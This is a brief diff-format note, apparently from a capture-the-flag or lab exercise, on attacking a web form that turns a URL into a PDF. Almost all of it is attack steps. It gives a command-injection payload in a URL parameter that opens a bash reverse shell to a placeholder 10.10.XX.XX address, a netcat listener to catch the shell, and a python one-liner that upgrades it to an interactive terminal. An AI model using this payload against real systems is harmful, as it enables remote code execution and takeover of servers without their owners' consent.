@@ -1,0 +1,7 @@
+You got a form that you put a url and gives you pdf.
+
+1. http://example.com/?name=#{'%20`bash -c "bash -i >& /dev/tcp/10.10.XX.XX/4444 0>&1"`'}
+2. nc -lvnp 4444
+
+  and then python3 -c 'import pty;pty.spawn("/bin/bash")'
+  
